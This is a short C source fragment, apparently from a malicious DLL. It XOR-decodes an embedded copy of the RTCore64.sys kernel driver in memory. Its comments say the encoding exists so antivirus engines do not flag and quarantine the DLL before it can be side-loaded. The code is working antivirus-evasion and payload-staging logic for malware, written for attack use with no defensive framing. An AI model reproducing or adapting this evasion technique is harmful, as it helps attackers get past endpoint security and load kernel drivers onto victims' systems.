// The payload above is stored XOR-ed with 0x5A. A verbatim copy of RTCore64.sys
// inside a PE is a one-signature hit for every AV engine, and the DLL gets
// quarantined before it can ever be side-loaded. Decoding happens once, in
// memory, right before the bytes are handed to the loader.
static BYTE s_RTCore64Plain[14024];
static volatile LONG s_RTCore64Ready = 0;

BYTE* RTCore64Plain(void)
{
	if (InterlockedCompareExchange(&s_RTCore64Ready, 1, 0) == 0)
	{
		for (int i = 0; i < 14024; i++)
			s_RTCore64Plain[i] = (BYTE)(RTCore64Driver[i] ^ 0x5A);
	}
	return s_RTCore64Plain;
}


